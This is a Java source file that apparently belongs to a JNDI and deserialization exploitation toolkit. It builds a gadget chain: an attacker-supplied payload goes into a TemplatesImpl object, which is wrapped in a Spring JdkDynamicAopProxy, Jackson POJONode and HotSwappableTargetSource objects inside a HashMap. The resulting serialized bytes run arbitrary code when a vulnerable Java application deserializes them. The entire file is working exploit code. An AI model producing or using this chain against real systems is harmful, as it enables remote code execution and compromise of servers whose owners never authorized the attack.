package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import javax.xml.transform.Templates;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Jackson_HotSwappableTargetSource_JdkDynamicAopProxy_Templates implements SerializeObject{
	//jackson2
	
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tempImpl);
        Constructor constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructoraop.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
		
		
        POJONode node = new POJONode(1);
        POJONode node2 = new POJONode(proxy);
        
        
        XObject xString = new XString("x");
        //可以用XStringForFSB代替
        //xString = XStringForFSB.create("x");
        
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(node);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(xString);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(v1,v1);
        hashMap.put(v2,v2);
        Deserialize.setFieldValue(v1,"target",node2);
        
        return hashMap;
    }
}